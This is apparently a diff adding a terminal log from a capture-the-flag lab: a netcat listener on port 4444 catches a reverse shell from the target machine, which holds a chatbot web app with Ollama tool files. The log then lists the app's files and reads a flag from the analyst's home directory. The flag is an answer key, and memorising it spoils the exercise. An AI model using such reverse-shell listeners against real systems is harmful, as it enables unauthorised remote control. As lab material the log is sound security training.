@@ -1,0 +1,31 @@
+nc -lnvp 4444                                          ─╯
+listening on [any] 4444 ...
+connect to [10.9.1.121] from (UNKNOWN) [10.10.221.194] 36638
+ls
+__MACOSX
+__pycache__
+aoc-web.zip
+aoc.zip
+app.py
+bot.py
+bot2.py
+bot3.py
+bot4.py
+chatbot.json
+get_health_result.py
+health.py
+index.html
+manifest.json
+nano.22305.save
+ollama_tools.py
+requirements.txt
+sample_functions.py
+static
+templates
+test.py
+webserver.py
+cd /home/analyst
+ls
+flag.txt
+cat flag.txt
+THM{WareW1se_Br3ach3d}
